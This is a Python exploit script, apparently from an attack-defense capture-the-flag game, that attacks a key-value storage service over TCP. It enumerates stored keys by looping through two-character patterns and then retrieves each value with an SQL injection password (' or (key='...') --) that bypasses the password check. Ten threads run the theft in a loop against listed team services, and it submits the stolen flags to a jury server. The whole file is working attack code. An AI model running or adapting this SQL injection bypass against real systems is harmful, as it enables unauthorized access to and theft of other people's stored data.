import socket,select,sys,string,random,threading,time,os

jury_ip='localhost'
jury_port=31337
myteam="team0"
if len(sys.argv) >1:
    ip_addr,PORT = sys.argv[1].split(":")
    PORT=int(PORT)
else:
    ip_addr = "localhost"
    PORT=10100

def idgen(N):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

def Store(s,k,v,p):
    s.send(b"store\n")
    res=s.recv(1024)
    if not b"Enter key" in res:
        sys.stderr.write("Enter key error \n"+res.decode())
        exit(1)

    s.send(b"%s\n" % (k.encode()))
    res=s.recv(1024)
    if not b"Enter value" in res:
        sys.stderr.write("Enter value error \n"+res.decode())
        exit(2)

    s.send(b"%s\n" % (v.encode()))
    res=s.recv(1024)
    if not b"Enter pass" in res:
        sys.stderr.write("Stored error \n"+res.decode())
        exit(3)

    s.send(b"%s\n" % (p.encode()))
    res=s.recv(1024)
    if not b"Stored" in res:
        sys.stderr.write("Stored error \n"+res)
        exit(3)
    return 1
def Load(s,k,p):
    s.send(b"load\n")
    res=s.recv(1024)
    if not b"Enter key" in res:
        sys.stderr.write("Load error 0\n"+res.decode())
        return
    s.send(b"%s\n" % (k.encode()))
    res=s.recv(1024)
    if not b"Enter pass(blank if no)" in res:
        sys.stderr.write("Load error 1\n"+res.decode())
        return
    s.send(b"%s\n" % (p.encode()))
    res=s.recv(1024)
    if b"No such value or invalid password" in res:
        sys.stderr.write("Load error 2\n"+res.decode())
        return
    return res.decode().strip()
def List(s,pat):
    s.send(b"list\n")
    res=s.recv(1024)
    print(res)
    if not b"Enter pattern" in res:
        sys.stderr.write("Search error 0\n"+res.decode())
        return
    s.send(b"%s\n" % (pat.encode()))
    res=s.recv(1024)
    all_data = list(map(lambda x: x.decode().strip(),res.split(b",")))
    print(res)
    print(all_data)
    return all_data

flags=[]
flags_m=threading.Lock()
queue=[]
queue_m=threading.Lock()
all_keys = set([])
def Worker():
    global queue,queue_m,all_keys
    while 1:
        task=None
        with queue_m:
            if len(queue)>0:
                task=queue[0]
                queue=queue[1:]
        if not task:
            time.sleep(1)
            continue
        ip_addr,PORT,flagid = task
        print(f"Processing {task}")
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_addr,PORT))
        all_keys.add(flagid)
        res = Load(s,flagid,f"' or (key='{flagid}' ) --")
        s.close()
        if res and "CTF" in res:
            print(f"Got Flag {res}")
            open("allk.txt","w").write("\n".join(all_keys))
            with flags_m:
                flags.append(res)
def FlagPass():
    global flags,flags_m
    while 1:
        task=[]
        with flags_m:
            if len(flags)>0:
                task=flags[:]
                flags=[]
        if len(task)==0:
            time.sleep(1)
            continue
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((jury_ip,jury_port))
        task=list(set(task))
        task = [myteam] + task
        task = list(map(lambda x: x.encode(),task))
        tosend = b"\n".join(task)+b"\n"
        print(tosend)
        s.send(tosend)
        print(s.recv(4096))
        s.close()
NUMT = 10
THS=[]
for i in range(NUMT):
    t=threading.Thread(target=Worker)
    t.daemon=True
    t.start()
t=threading.Thread(target=FlagPass)
t.daemon=True
t.start()


def Attack(ip_addr,PORT):
    global all_keys
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_addr,PORT))
    all_k=[]
    for c1 in "0123456789":
        for c2 in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            c=c1+c2
            r = List(s,c)
            if r:
                all_k+=r
    s.close()
    if os.path.isfile("allk.txt"):
        all_keys = set(list(map(lambda x: x.strip(),list(open("allk.txt")))))
    for k in all_k:
        if k not in all_keys:
            queue.append((ip_addr,PORT,k))
    while len(queue) >0:
        time.sleep(1)

    while len(flags) >0:
        time.sleep(1)
    open("allk.txt","w").write("\n".join(all_keys))


mode = 2
if mode == 1:
    Attack(ip_addr,PORT)
    time.sleep(10)
else: #('localhost',10200)
    while 1:
        teams= [('localhost',10100),('localhost',10200)]
        for t in teams:
            Attack(t[0],t[1])
        time.sleep(10)
